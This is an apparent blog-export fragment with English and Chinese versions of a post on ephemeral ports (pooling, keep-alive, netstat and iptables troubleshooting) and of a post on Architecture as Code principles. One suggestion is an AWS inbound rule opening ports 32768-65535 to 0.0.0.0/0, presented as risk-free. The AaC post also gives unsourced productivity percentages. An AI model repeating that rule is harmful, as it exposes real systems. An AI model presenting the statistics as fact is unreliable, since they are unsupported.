connection. API Clients: Microservices making REST or GraphQL API calls use ephemeral ports for each request. SSH and Remote Desktop: When you SSH into a server or use remote desktop, your client uses an ephemeral port for the connection. Server Applications (Outbound Connections) While servers listen on well-known ports for incoming connections, they use ephemeral ports when making outbound connections: Web Servers: When your web server connects to a database or external API, it uses ephemeral ports. Proxy Servers: Forward proxies use ephemeral ports when connecting to destination servers on behalf of clients. Load Balancers: When distributing traffic to backend servers, load balancers use ephemeral ports for connections to each backend. Microservices: Service-to-service communication in microservice architectures relies heavily on ephemeral ports. System Services DNS Queries: When your computer resolves domain names, it uses ephemeral ports for DNS queries. NTP (Network Time Protocol): Time synchronization uses ephemeral ports for queries to time servers. DHCP Clients: When obtaining an IP address, DHCP clients use specific ports, though not always from the ephemeral range. graph TB subgraph \"Your Computer\" Browser([\"🌐 Web Browser\"]) Email([\"📧 Email Client\"]) App([\"📱 Application\"]) DB([\"🗄️ Database Client\"]) end subgraph \"Operating System\" PortPool([\"Ephemeral Port Pool49152-65535\"]) end subgraph \"Internet\" WebServer([\"Web Server:443\"]) MailServer([\"Mail Server:993\"]) API([\"API Server:443\"]) Database([\"Database:5432\"]) end Browser -->|Port 54321| PortPool Email -->|Port 54322| PortPool App -->|Port 54323| PortPool DB -->|Port 54324| PortPool PortPool -->|54321:443| WebServer PortPool -->|54322:993| MailServer PortPool -->|54323:443| API PortPool -->|54324:5432| Database style PortPool fill:#e3f2fd,stroke:#1976d2,stroke-width:3px Best Practices for Client Applications Understanding best practices helps you build robust, scalable systems that handle network connections efficiently. 1. Implement Connection Pooling Instead of creating new connections for each request, reuse existing connections through connection pooling: # Example: Database connection pooling from sqlalchemy import create_engine from sqlalchemy.pool import QueuePool # Create engine with connection pool engine &#x3D; create_engine( &#39;postgresql:&#x2F;&#x2F;user:pass@localhost&#x2F;db&#39;, poolclass&#x3D;QueuePool, pool_size&#x3D;20, # Maintain 20 connections max_overflow&#x3D;10, # Allow 10 additional connections pool_recycle&#x3D;3600 # Recycle connections after 1 hour ) Connection pooling dramatically reduces ephemeral port usage by reusing connections instead of creating new ones for each operation. 2. Use HTTP Keep-Alive Enable HTTP keep-alive to reuse TCP connections for multiple HTTP requests: # Example: Python requests with session (keep-alive) import requests session &#x3D; requests.Session() # Multiple requests reuse the same connection response1 &#x3D; session.get(&#39;https:&#x2F;&#x2F;api.example.com&#x2F;users&#39;) response2 &#x3D; session.get(&#39;https:&#x2F;&#x2F;api.example.com&#x2F;posts&#39;) response3 &#x3D; session.get(&#39;https:&#x2F;&#x2F;api.example.com&#x2F;comments&#39;) Without keep-alive, each request creates a new connection and uses a new ephemeral port. With keep-alive, one connection handles multiple requests. 3. Monitor Ephemeral Port Usage Track how many ephemeral ports your system uses, especially on high-traffic servers: # Linux: Count connections in different states netstat -an | grep TIME_WAIT | wc -l # Check current ephemeral port range cat &#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;ip_local_port_range # Windows: View active connections netstat -ano | find &quot;ESTABLISHED&quot; &#x2F;c 📊 Monitoring ThresholdsSet alerts when ephemeral port usage exceeds: Warning: 60% of available ports Critical: 80% of available ports This gives you time to investigate before exhaustion occurs. 4. Configure Firewall Rules Properly Ensure firewalls allow ephemeral port ranges for return traffic: # Linux iptables: Allow established connections iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT # AWS Security Group: Allow ephemeral ports for return traffic # Inbound rule: Custom TCP, Port Range: 32768-65535, Source: 0.0.0.0&#x2F;0 🔒 Security NoteAllowing ephemeral ports doesn't create security risks when combined with stateful firewall rules. The firewall only allows return traffic for connections initiated from inside your network. Common Issues and Troubleshooting Understanding common ephemeral port issues helps you diagnose and resolve network problems quickly. Port Exhaustion Symptoms: Applications fail to establish new connections, “Cannot assign requested address” errors, timeouts. Diagnosis: # Check current connections by state netstat -an | awk &#39;&#123;print $6&#125;&#39; | sort | uniq -c | sort -n # Find processes using most connections netstat -anp | grep ESTABLISHED | awk &#39;&#123;print $7&#125;&#39; | cut -d&#39;&#x2F;&#39; -f1 | sort | uniq -c | sort -n Solutions: Expand ephemeral port range Implement connection pooling Reduce TIME_WAIT duration (carefully) Enable TCP connection reuse Scale horizontally to distribute load Firewall Blocking Return Traffic Symptoms: Outbound connections fail or timeout, even though the destination is reachable. Diagnosis: # Test connection with tcpdump sudo tcpdump -i any -n port 443 # Check firewall rules sudo iptables -L -n -v Solutions: Add rules allowing ephemeral port range for established connections Verify stateful firewall inspection is enabled Check both host and network firewalls 🔍 Debugging ChecklistWhen troubleshooting ephemeral port issues: ✅ Check available ephemeral ports: cat /proc/sys/net/ipv4/ip_local_port_range ✅ Count active connections: netstat -an | wc -l ✅ Identify connections in TIME_WAIT: netstat -an | grep TIME_WAIT | wc -l ✅ Verify firewall rules allow ephemeral range ✅ Check application connection pooling configuration ✅ Monitor system logs for &quot;address already in use&quot; errors ✅ Review recent configuration changes What’s Next? In this post, we’ve explored how ephemeral ports work from the client perspective - how your applications use them to establish outbound connections, and how to optimize their usage for better performance and reliability. But there’s another side to the ephemeral port story: what happens when server applications use dynamic ports in the ephemeral range? This creates unique challenges for discoverability, security, and firewall configuration. In Part 2, we’ll dive into: Why RPC services shouldn’t use ephemeral ports The problems with dynamic port assignment for server applications Real-world example: Microsoft SQL Server named instances How to configure static ports instead of dynamic ephemeral ports Best practices for Windows RPC and WMI port configuration Further Reading RFC 6335 - Internet Assigned Numbers Authority (IANA) Procedures for Port Number Management TCP/IP Illustrated, Volume 1: The Protocols Linux Network Administrator’s Guide","categories":[{"name":"Development","slug":"Development","permalink":"https://neo01.com/categories/Development/"}],"tags":[{"name":"Infrastructure","slug":"Infrastructure","permalink":"https://neo01.com/tags/Infrastructure/"},{"name":"Security","slug":"Security","permalink":"https://neo01.com/tags/Security/"},{"name":"Networking","slug":"Networking","permalink":"https://neo01.com/tags/Networking/"}]},{"title":"理解臨時埠：網路通訊的隱形工作者","slug":"2025/08/Understanding_Ephemeral_Ports_Part1-zh-TW","date":"un66fin66","updated":"un22fin22","comments":true,"path":"/zh-TW/2025/08/Understanding_Ephemeral_Ports_Part1/","permalink":"https://neo01.com/zh-TW/2025/08/Understanding_Ephemeral_Ports_Part1/","excerpt":"揭開每個網路連接背後的隱形工作者。了解臨時埠如何讓你的電腦同時處理數百個連接。","text":"每次你開啟網頁、發送電子郵件或串流影片時，你的電腦都在執行一個小小的協調奇蹟。在幕後，你的系統需要同時處理數十甚至數百個網路連接——每個連接都需要自己獨特的「地址」，這樣資料才知道要去哪裡。但這裡有個謎題：你的電腦只有一個 IP 位址。它如何追蹤哪些資料屬於哪個應用程式？ 答案在於一種叫做臨時埠的東西——當你發起網路連接時，作業系統會自動分配的臨時、短暫的埠號。它們是網際網路的隱形工作者，按需建立，不再需要時就被丟棄，但對我們在線上做的一切都絕對必要。 把你的電腦想像成一棟擁有數千個信箱的大型公寓大樓。你的 IP 位址是大樓的街道地址，但每個應用程式都需要自己的信箱號碼（埠）來接收郵件。臨時埠就像是需要時出現、對話結束時消失的臨時信箱。 什麼是臨時埠？ 臨時埠是當你的應用程式發起對外網路連接時，作業系統自動分配的臨時埠號。「臨時」（ephemeral）這個詞意味著「持續很短的時間」，這完美地描述了它們的本質——它們只在單一連接的持續時間內存在。 當你在瀏覽器中輸入 URL 時，你的電腦需要建立與網頁伺服器的連接。伺服器監聽眾所周知的埠（HTTP 通常是埠 80，HTTPS 是埠 443），但你的電腦需要自己的埠號來接收回應。你的作業系統會自動選擇一個可用的臨時埠——比如說埠 54321——並將其用於這個特定的連接。 sequenceDiagram participant Client as 你的電腦(IP: 192.168.1.100) participant OS as 作業系統 participant Server as 網頁伺服器(IP: 93.184.216.34) Client->>OS: 請求連接到example.com:443 OS->>OS: 分配臨時埠(例如 54321) OS->>Server: 從192.168.1.100:54321連接到 93.184.216.34:443 Server->>OS: 回應到192.168.1.100:54321 OS->>Client: 將資料傳遞給瀏覽器 Note over OS: 連接結束 OS->>OS: 釋放埠 54321以供重用 埠號範圍 埠號範圍從 0 到 65535，分為三個類別： 眾所周知的埠（0-1023）：保留給系統服務和常見協定（HTTP、HTTPS、SSH、FTP） 註冊埠（1024-49151）：由 IANA（網際網路號碼分配局）分配給特定應用程式 動態/私有埠（49152-65535）：官方的臨時埠範圍 📊 埠範圍詳情 Linux（舊版）：32768-61000（28,233 個埠） Linux（現代）：32768-60999（28,232 個埠） Windows：49152-65535（16,384 個埠）- 遵循 RFC 6335 FreeBSD：10000-65535（55,536 個埠） macOS：49152-65535（16,384 個埠）- 遵循 RFC 6335 (function() { if (typeof echarts !== 'undefined') { var chart = echarts.init(document.getElementById('chart_0ffa9e744')); var option = { \"title\": { \"text\": \"各作業系統的臨時埠範圍\" }, \"tooltip\": {}, \"xAxis\": { \"type\": \"category\", \"data\": [\"Linux (舊)\", \"Linux (新)\", \"Windows\", \"FreeBSD\", \"macOS\"] }, \"yAxis\": { \"type\": \"value\", \"name\": \"埠數量\" }, \"series\": [{ \"type\": \"bar\", \"data\": [28233, 28232, 16384, 55536, 16384], \"itemStyle\": { \"color\": \"#1976d2\" } }] }; chart.setOption(option); } })(); 臨時埠如何運作 理解臨時埠的生命週期有助於揭開網路通訊的神秘面紗。讓我們逐步了解當你造訪網站時會發生什麼。 連接生命週期 1. 應用程式發起連接 當你的瀏覽器想要獲取網頁時，它會要求作業系統建立與伺服器的 TCP 連接。瀏覽器不會指定要使用哪個本地埠——它將該決定留給作業系統。 2. 作業系統分配臨時埠 你的作業系統掃描其可用臨時埠池，並選擇一個目前未使用的埠。這在微秒內發生，對應用程式完全透明。 3. 連接建立 連接現在由四部分元組唯一識別： 來源 IP（你電腦的 IP 位址） 來源埠（臨時埠） 目的地 IP（伺服器的 IP 位址） 目的地埠（眾所周知的埠，如 443） 4. 資料交換 在你的瀏覽器和伺服器之間流動的所有資料都使用這個四部分識別符。當伺服器發送資料回來時，它會將其定址到你的 IP 和特定的臨時埠，確保它到達正確的應用程式。 5. 連接關閉 當通訊結束時，作業系統會將臨時埠標記為可重用。然而，通常會有一個短暫的等待期（TIME_WAIT 狀態），以確保來自舊連接的延遲封包不會到達並混淆使用相同埠的新連接。 stateDiagram-v2 [*] --> Available: 埠在池中 Available --> Assigned: 應用程式請求連接 Assigned --> Active: 連接建立 Active --> TimeWait: 連接關閉 TimeWait --> Available: 等待期到期 Available --> [*] note right of TimeWait 通常 30-120 秒 防止封包混淆 end note 多個同時連接 你的電腦可以維持數千個同時連接，每個連接使用不同的臨時埠。當你瀏覽現代網站時，你的瀏覽器可能會同時開啟 20-50 個連接——一個用於 HTML，多個用於圖片、樣式表、JavaScript 檔案和 API 呼叫。每個連接都獲得自己的臨時埠。 🌐 真實場景你開啟這個部落格網站。你的瀏覽器建立： 埠 54321 → neo01.com:443（主 HTML 頁面） 埠 54322 → cdn.neo01.com:443（CSS 樣式表） 埠 54323 → cdn.neo01.com:443（JavaScript 檔案） 埠 54324 → images.neo01.com:443（標題圖片） 埠 54325 → api.neo01.com:443（最新標題） 埠 54326 → ads.neo01.com:443（廣告） 每個連接都是獨立的，但都同時發生，每個都有自己的臨時埠，確保資料到達正確的目的地。 什麼使用臨時埠？ 臨時埠是幾乎所有網路通訊的基礎。了解誰使用它們以及如何使用有助於你設計更好的系統並排除網路問題。 客戶端應用程式 網頁瀏覽器：每個 HTTP/HTTPS 請求都使用臨時埠。現代瀏覽器為每個網站開啟多個連接以進行並行下載，每個連接都需要自己的埠。 電子郵件客戶端：檢查電子郵件時，你的客戶端使用臨時埠連接到郵件伺服器（SMTP、IMAP、POP3）。 資料庫客戶端：連接到資料庫（MySQL、PostgreSQL、MongoDB）的應用程式為每個資料庫連接使用臨時埠。 API 客戶端：進行 REST 或 GraphQL API 呼叫的微服務為每個請求使用臨時埠。 SSH 和遠端桌面：當你 SSH 到伺服器或使用遠端桌面時，你的客戶端為連接使用臨時埠。 伺服器應用程式（對外連接） 雖然伺服器在眾所周知的埠上監聽傳入連接，但它們在進行對外連接時使用臨時埠： 網頁伺服器：當你的網頁伺服器連接到資料庫或外部 API 時，它使用臨時埠。 代理伺服器：轉發代理在代表客戶端連接到目的地伺服器時使用臨時埠。 負載平衡器：在將流量分配到後端伺服器時，負載平衡器為每個後端的連接使用臨時埠。 微服務：微服務架構中的服務間通訊嚴重依賴臨時埠。 系統服務 DNS 查詢：當你的電腦解析網域名稱時，它使用臨時埠進行 DNS 查詢。 NTP（網路時間協定）：時間同步使用臨時埠查詢時間伺服器。 DHCP 客戶端：獲取 IP 位址時，DHCP 客戶端使用特定埠，儘管不總是來自臨時埠範圍。 graph TB subgraph \"你的電腦\" Browser([\"🌐 網頁瀏覽器\"]) Email([\"📧 電子郵件客戶端\"]) App([\"📱 應用程式\"]) DB([\"🗄️ 資料庫客戶端\"]) end subgraph \"作業系統\" PortPool([\"臨時埠池49152-65535\"]) end subgraph \"網際網路\" WebServer([\"網頁伺服器:443\"]) MailServer([\"郵件伺服器:993\"]) API([\"API 伺服器:443\"]) Database([\"資料庫:5432\"]) end Browser -->|埠 54321| PortPool Email -->|埠 54322| PortPool App -->|埠 54323| PortPool DB -->|埠 54324| PortPool PortPool -->|54321:443| WebServer PortPool -->|54322:993| MailServer PortPool -->|54323:443| API PortPool -->|54324:5432| Database style PortPool fill:#e3f2fd,stroke:#1976d2,stroke-width:3px 客戶端應用程式的最佳實踐 了解最佳實踐有助於你建立強健、可擴展的系統，有效處理網路連接。 1. 實作連接池 不要為每個請求建立新連接，而是透過連接池重用現有連接： # 範例：資料庫連接池 from sqlalchemy import create_engine from sqlalchemy.pool import QueuePool # 使用連接池建立引擎 engine &#x3D; create_engine( &#39;postgresql:&#x2F;&#x2F;user:pass@localhost&#x2F;db&#39;, poolclass&#x3D;QueuePool, pool_size&#x3D;20, # 維持 20 個連接 max_overflow&#x3D;10, # 允許 10 個額外連接 pool_recycle&#x3D;3600 # 1 小時後回收連接 ) 連接池透過重用連接而不是為每個操作建立新連接，大幅減少臨時埠的使用。 2. 使用 HTTP Keep-Alive 啟用 HTTP keep-alive 以重用 TCP 連接進行多個 HTTP 請求： # 範例：使用 session 的 Python requests（keep-alive） import requests session &#x3D; requests.Session() # 多個請求重用相同的連接 response1 &#x3D; session.get(&#39;https:&#x2F;&#x2F;api.example.com&#x2F;users&#39;) response2 &#x3D; session.get(&#39;https:&#x2F;&#x2F;api.example.com&#x2F;posts&#39;) response3 &#x3D; session.get(&#39;https:&#x2F;&#x2F;api.example.com&#x2F;comments&#39;) 沒有 keep-alive，每個請求都會建立新連接並使用新的臨時埠。使用 keep-alive，一個連接處理多個請求。 3. 監控臨時埠使用情況 追蹤你的系統使用多少臨時埠，特別是在高流量伺服器上： # Linux：計算不同狀態的連接 netstat -an | grep TIME_WAIT | wc -l # 檢查目前的臨時埠範圍 cat &#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;ip_local_port_range # Windows：檢視活動連接 netstat -ano | find &quot;ESTABLISHED&quot; &#x2F;c 📊 監控閾值當臨時埠使用超過以下情況時設定警報： 警告：可用埠的 60% 嚴重：可用埠的 80% 這讓你有時間在耗盡發生之前進行調查。 4. 正確設定防火牆規則 確保防火牆允許臨時埠範圍用於回傳流量： # Linux iptables：允許已建立的連接 iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT # AWS Security Group：允許臨時埠用於回傳流量 # 入站規則：自訂 TCP，埠範圍：32768-65535，來源：0.0.0.0&#x2F;0 🔒 安全注意事項與狀態防火牆規則結合時，允許臨時埠不會造成安全風險。防火牆只允許從你的網路內部發起的連接的回傳流量。 常見問題和疑難排解 了解常見的臨時埠問題有助於你快速診斷和解決網路問題。 埠耗盡 症狀：應用程式無法建立新連接、「無法分配請求的位址」錯誤、逾時。 診斷： # 按狀態檢查目前的連接 netstat -an | awk &#39;&#123;print $6&#125;&#39; | sort | uniq -c | sort -n # 找出使用最多連接的程序 netstat -anp | grep ESTABLISHED | awk &#39;&#123;print $7&#125;&#39; | cut -d&#39;&#x2F;&#39; -f1 | sort | uniq -c | sort -n 解決方案： 擴展臨時埠範圍 實作連接池 減少 TIME_WAIT 持續時間（謹慎） 啟用 TCP 連接重用 水平擴展以分散負載 防火牆阻擋回傳流量 症狀：對外連接失敗或逾時，即使目的地可達。 診斷： # 使用 tcpdump 測試連接 sudo tcpdump -i any -n port 443 # 檢查防火牆規則 sudo iptables -L -n -v 解決方案： 新增允許已建立連接的臨時埠範圍的規則 驗證已啟用狀態防火牆檢查 檢查主機和網路防火牆 🔍 除錯檢查清單疑難排解臨時埠問題時： ✅ 檢查可用的臨時埠：cat /proc/sys/net/ipv4/ip_local_port_range ✅ 計算活動連接：netstat -an | wc -l ✅ 識別 TIME_WAIT 中的連接：netstat -an | grep TIME_WAIT | wc -l ✅ 驗證防火牆規則允許臨時埠範圍 ✅ 檢查應用程式連接池設定 ✅ 監控系統日誌中的「位址已在使用中」錯誤 ✅ 檢視最近的設定變更 接下來呢？ 在本文中，我們探討了臨時埠如何從客戶端角度運作——你的應用程式如何使用它們來建立對外連接，以及如何最佳化它們的使用以獲得更好的效能和可靠性。 但臨時埠故事還有另一面：當伺服器應用程式在臨時埠範圍內使用動態埠時會發生什麼？這為可發現性、安全性和防火牆設定帶來了獨特的挑戰。 在 Part 2 中，我們將深入探討： 為什麼 RPC 服務不應使用臨時埠 伺服器應用程式動態埠分配的問題 真實案例：Microsoft SQL Server 具名執行個體 如何設定靜態埠而不是動態臨時埠 Windows RPC 和 WMI 埠設定的最佳實踐 延伸閱讀 RFC 6335 - Internet Assigned Numbers Authority (IANA) Procedures for Port Number Management TCP/IP Illustrated, Volume 1: The Protocols Linux Network Administrator’s Guide","categories":[{"name":"Development","slug":"Development","permalink":"https://neo01.com/categories/Development/"}],"tags":[{"name":"Infrastructure","slug":"Infrastructure","permalink":"https://neo01.com/tags/Infrastructure/"},{"name":"Security","slug":"Security","permalink":"https://neo01.com/tags/Security/"},{"name":"Networking","slug":"Networking","permalink":"https://neo01.com/tags/Networking/"}],"lang":"zh-TW"},{"title":"Architecture as Code: Part 2 - Building the Foundation","slug":"2025/07/Architecture_As_Code_Part_2_Building_the_Foundation","date":"un00fin00","updated":"un00fin00","comments":true,"path":"2025/07/Architecture_As_Code_Part_2_Building_the_Foundation/","permalink":"https://neo01.com/2025/07/Architecture_As_Code_Part_2_Building_the_Foundation/","excerpt":"Transform architecture from abstract concepts into enforceable code. Discover explicit decisions, automated validation, and living documentation that prevent 2 AM production disasters.","text":"Architecture as Code: Part 2 - Building the Foundation This is Part 2 of our 7-part series exploring Architecture as Code (AaC). Read Part 1 to understand how AaC emerged from the limitations of traditional architecture. The Architecture Emergency Room Picture this: It’s 2 AM, and your production system is down. As you dig through the code, you realize the root cause is a simple architectural violation—a service calling another service directly instead of through the API gateway you designed six months ago. The problem? No one enforced that architectural rule. It was documented in a PDF that no one reads anymore. The violation slipped through code reviews because reviewers were focused on functionality, not architecture. This nightmare scenario is all too common, but Architecture as Code provides the foundation to prevent it. In this post, we’ll explore the core principles that make AaC work and the concrete benefits it delivers. Core Principle 1: Explicit Architectural Decisions The first principle of Architecture as Code is making architectural decisions explicit and machine-readable. Instead of hiding decisions in documents or tribal knowledge, you capture them as code. From Implicit to Explicit Before AaC: &#x2F;&#x2F; Some service somewhere const userService &#x3D; new UserService(); const order &#x3D; userService.getUserOrders(userId); &#x2F;&#x2F; Direct coupling - architectural violation? With AaC: # architecture.yml services: order-service: dependencies: - user-service communication: - through: api-gateway - pattern: mediator Now the architectural constraint is explicit and enforceable. graph LR A[Implicit DecisionHidden in Code] -->|Transform| B[Explicit DecisionDefined in Architecture] B --> C[Machine-Readable] B --> D[Enforceable] B --> E[Testable] style A fill:#ff6b6b,stroke:#c92a2a style B fill:#51cf66,stroke:#2f9e44 style C fill:#4dabf7,stroke:#1971c2 style D fill:#4dabf7,stroke:#1971c2 style E fill:#4dabf7,stroke:#1971c2 Decision Types in AaC 📋 Types of Architectural DecisionsArchitecture as Code captures different types of decisions: Structural Decisions: How components are organized and connected Behavioral Decisions: How components interact and communicate Quality Decisions: Performance, security, and scalability requirements Technology Decisions: Which frameworks, databases, and tools to use Governance Decisions: Standards, patterns, and compliance rules Core Principle 2: Version Control and Collaboration By representing architecture as code, teams can leverage the full power of version control systems. This transforms architecture from a solitary activity into a collaborative, trackable process. Architecture as a Team Sport ✅ Benefits of Version Control for ArchitectureVersion control enables: Traceability: Every architectural change is tracked with commit messages and blame information Reviewability: Pull requests for architectural changes allow team input and approval Revertibility: Bad architectural decisions can be rolled back like any code change Branching: Teams can experiment with architectural alternatives safely Collaborative Architecture Design # Architecture changes become collaborative git checkout -b feature&#x2F;new-microservice-architecture # Make changes to architecture files git add architecture&#x2F; git commit -m &quot;Add event-driven architecture for user notifications&quot; git push origin feature&#x2F;new-microservice-architecture # Create pull request for team review Core Principle 3: Automated Validation and Testing Architecture as Code enables automated validation of architectural compliance. This shifts architectural governance from manual reviews to automated checks. Architectural Test Suites Just as you write unit tests for code, you can write tests for architecture: &#x2F;&#x2F; Example architectural test describe(&#39;Microservices Architecture&#39;, () &#x3D;&gt; &#123; it(&#39;should not allow direct service-to-service communication&#39;, () &#x3D;&gt; &#123; const violations &#x3D; validateArchitecture(architectureModel); expect(violations.directCommunication).toBeEmpty(); &#125;); it(&#39;should require circuit breakers for external dependencies&#39;, () &#x3D;&gt; &#123; const services &#x3D; getServicesWithExternalDeps(architectureModel); services.forEach(service &#x3D;&gt; &#123; expect(service.hasCircuitBreaker).toBe(true); &#125;); &#125;); &#125;); Continuous Architectural Validation 🔄 CI/CD Integration PointsAutomated validation runs as part of your CI/CD pipeline: Pre-commit hooks: Check architecture on every commit Pull request validation: Automated checks before merging Deployment gates: Architecture compliance before production deployment Runtime monitoring: Continuous validation in production graph TD A[Developer Commits] --> B[Pre-commit Hook] B -->|Pass| C[Push to Branch] B -->|Fail| A C --> D[Pull Request] D --> E[Architectural Validation] E -->|Pass| F[Code Review] E -->|Fail| A F --> G[Merge to Main] G --> H[Deployment Gate] H -->|Pass| I[Deploy to Production] H -->|Fail| J[Block Deployment] I --> K[Runtime Monitoring] K -->|Violation Detected| L[Alert Team] style B fill:#ffd43b,stroke:#fab005 style E fill:#ffd43b,stroke:#fab005 style H fill:#ffd43b,stroke:#fab005 style K fill:#ffd43b,stroke:#fab005 style I fill:#51cf66,stroke:#2f9e44 style J fill:#ff6b6b,stroke:#c92a2a Core Principle 4: Living Documentation Unlike traditional documentation that becomes stale, architecture as code generates living documentation that stays synchronized with the actual system. Auto-Generated Documentation From your architecture code, you can generate: Interactive diagrams that reflect current system state API documentation based on defined service interfaces Dependency graphs showing service relationships Compliance reports for regulatory requirements Architecture decision records (ADRs) linked to code changes Always Up-to-Date Since documentation is generated from code: It automatically reflects the current architecture Changes are tracked in version control Multiple formats can be generated (HTML, PDF, diagrams) It’s always accurate (no manual maintenance required) The Benefits: Why It Matters With these four core principles working together—explicit decisions, version control, automated validation, and living documentation—Architecture as Code delivers compelling advantages that extend across the software development lifecycle. graph LR OS[Order Service] -->|✓ Through Gateway| AG[API Gateway] AG --> US[User Service] AG --> PS[Payment Service] OS -.x|✗ Direct CallViolation|.-> US style OS fill:#4dabf7,stroke:#1971c2 style AG fill:#51cf66,stroke:#2f9e44 style US fill:#4dabf7,stroke:#1971c2 style PS fill:#4dabf7,stroke:#1971c2 Improved Consistency and Quality By defining architectural patterns as reusable code templates, teams ensure consistent application of design principles: Standardized Patterns: All microservices follow the same structure Quality Gates: Automated checks prevent architectural anti-patterns Reduced Technical Debt: Violations are caught early Faster Onboarding: New team members understand patterns immediately Enhanced Collaboration and Communication AaC facilitates better communication between architects, developers, and stakeholders: Shared Understanding: Code provides unambiguous specifications Collaborative Design: Architecture evolves through code reviews Stakeholder Involvement: Non-technical stakeholders can review architectural changes Reduced Misunderstandings: Code is more precise than natural language Accelerated Development and Deployment Automated architectural validation and code generation accelerate development cycles: Rapid Scaffolding: New components follow established patterns Automated Validation: No manual architectural reviews Faster Feedback: Immediate validation results Reduced Boilerplate: Templates generate consistent code Scalability and Maintainability As systems grow, maintaining architectural consistency becomes increasingly challenging: Enterprise Scale: Governance across multiple teams and projects Evolution Support: Architecture adapts while maintaining integrity Automated Governance: Standards enforced without micromanagement Long-term Maintenance: Architectural decisions remain current and enforceable Real-World Impact: The Numbers Don’t Lie Organizations adopting AaC report significant improvements: 85% reduction in architectural violations reaching production 40% faster time-to-market for new features 60% improvement in architectural consistency across teams 50% reduction in technical debt accumulation 30% increase in team productivity The Foundation is Laid These core principles—explicit decisions, version control, automated validation, and living documentation—form the foundation of Architecture as Code. They transform architecture from an abstract concept into a practical, enforceable discipline. In Part 3, we’ll explore how these principles enable deep automation throughout the software development lifecycle, from continuous validation to automated refactoring. 💭 Reflect on Your Experience Which of these four principles would have the biggest impact on your current projects? Have you experienced the &quot;2 AM architectural violation&quot; scenario? What's preventing your team from adopting automated architectural validation? Share your thoughts and experiences in the comments below! Next in Series: Part 3 - The Automation Engine: How AaC Transforms Development Previous in Series: Part 1 - The Revolution Begins","categories":[{"name":"Architecture","slug":"Architecture","permalink":"https://neo01.com/categories/Architecture/"}],"tags":[{"name":"AI","slug":"AI","permalink":"https://neo01.com/tags/AI/"},{"name":"Architecture","slug":"Architecture","permalink":"https://neo01.com/tags/Architecture/"},{"name":"Software Engineering","slug":"Software-Engineering","permalink":"https://neo01.com/tags/Software-Engineering/"}]},{"title":"架构即代码：第二部分 - 建立基础","slug":"2025/07/Architecture_As_Code_Part_2_Building_the_Foundation-zh-CN","date":"un00fin00","updated":"un33fin33","comments":true,"path":"/zh-CN/2025/07/Architecture_As_Code_Part_2_Building_the_Foundation/","permalink":"https://neo01.com/zh-CN/2025/07/Architecture_As_Code_Part_2_Building_the_Foundation/","excerpt":"将架构从抽象概念转变为可执行代码。探索明确决策、自动验证和活文档如何防止凌晨2点的生产灾难。","text":"架构即代码：第二部分 - 建立基础 这是我们探索架构即代码（AaC）的七部曲系列的第二部分。阅读第一部分了解 AaC 如何从传统架构的局限性中出现。 架构急诊室 想象一下：凌晨 2 点，你的生产系统宕机了。当你深入研究代码时，你意识到根本原因是一个简单的架构违规——一个服务直接调用另一个服务，而不是通过你六个月前设计的 API 网关。 问题？没有人强制执行那个架构规则。它被记录在一个没有人再阅读的 PDF 中。这个违规在代码审查中溜过去了，因为审查者专注于功能，而不是架构。 这种噩梦般的情景太常见了，但架构即代码提供了防止它的基础。在这篇文章中，我们将探索使 AaC 工作的核心原则以及它提供的具体好处。 核心原则 1：明确的架构决策 架构即代码的第一个原则是使架构决策明确且机器可读。与其将决策隐藏在文档或部落知识中，你将它们捕获为代码。 从隐式到明确 AaC 之前： &#x2F;&#x2F; 某处的某个服务 const userService &#x3D; new UserService(); const order &#x3D; userService.getUserOrders(userId); &#x2F;&#x2F; 直接耦合 - 架构违规？ 使用 AaC： # architecture.yml services: order-service: dependencies: - user-service communication: - through: api-gateway - pattern: mediator 现在架构约束是明确的且可强制执行的。 graph LR A[隐式决策隐藏在代码中] -->|转换| B[明确决策在架构中定义] B --> C[机器可读] B --> D[可强制执行] B --> E[可测试] style A fill:#ff6b6b,stroke:#c92a2a style B fill:#51cf66,stroke:#2f9e44 style C fill:#4dabf7,stroke:#1971c2 style D fill:#4dabf7,stroke:#1971c2 style E fill:#4dabf7,stroke:#1971c2 AaC 中的决策类型 📋 架构决策的类型架构即代码捕获不同类型的决策： 结构决策：组件如何组织和连接 行为决策：组件如何交互和通信 质量决策：性能、安全性和可扩展性要求 技术决策：使用哪些框架、数据库和工具 治理决策：标准、模式和合规规则 核心原则 2：版本控制和协作 通过将架构表示为代码，团队可以利用版本控制系统的全部功能。这将架构从孤立的活动转变为协作的、可追踪的过程。 架构作为团队运动 ✅ 架构版本控制的好处版本控制使能： 可追溯性：每个架构变更都通过提交消息和责任信息进行追踪 可审查性：架构变更的拉取请求允许团队输入和批准 可回滚性：糟糕的架构决策可以像任何代码变更一样回滚 分支：团队可以安全地尝试架构替代方案 协作架构设计 # 架构变更变得协作 git checkout -b feature&#x2F;new-microservice-architecture # 对架构文件进行更改 git add architecture&#x2F; git commit -m &quot;为用户通知添加事件驱动架构&quot; git push origin feature&#x2F;new-microservice-architecture # 创建拉取请求供团队审查 核心原则 3：自动验证和测试 架构即代码使架构合规性的自动验证成为可能。这将架构治理从手动审查转变为自动检查。 架构测试套件 就像你为代码编写单元测试一样，你可以为架构编写测试： &#x2F;&#x2F; 架构测试示例 describe(&#39;微服务架构&#39;, () &#x3D;&gt; &#123; it(&#39;不应允许直接的服务到服务通信&#39;, () &#x3D;&gt; &#123; const violations &#x3D; validateArchitecture(architectureModel); expect(violations.directCommunication).toBeEmpty(); &#125;); it(&#39;应该要求外部依赖项的断路器&#39;, () &#x3D;&gt; &#123; const services &#x3D; getServicesWithExternalDeps(architectureModel); services.forEach(service &#x3D;&gt; &#123; expect(service.hasCircuitBreaker).toBe(true); &#125;); &#125;); &#125;); 持续架构验证 🔄 CI/CD 集成点自动验证作为 CI/CD 管道的一部分运行： 预提交钩子：在每次提交时检查架构 拉取请求验证：合并前的自动检查 部署门：生产部署前的架构合规性 运行时监控：生产中的持续验证 graph TD A[开发人员提交] --> B[预提交钩子] B -->|通过| C[推送到分支] B -->|失败| A C --> D[拉取请求] D --> E[架构验证] E -->|通过| F[代码审查] E -->|失败| A F --> G[合并到主分支] G --> H[部署门] H -->|通过| I[部署到生产] H -->|失败| J[阻止部署] I --> K[运行时监控] K -->|检测到违规| L[警告团队] style B fill:#ffd43b,stroke:#fab005 style E fill:#ffd43b,stroke:#fab005 style H fill:#ffd43b,stroke:#fab005 style K fill:#ffd43b,stroke:#fab005 style I fill:#51cf66,stroke:#2f9e44 style 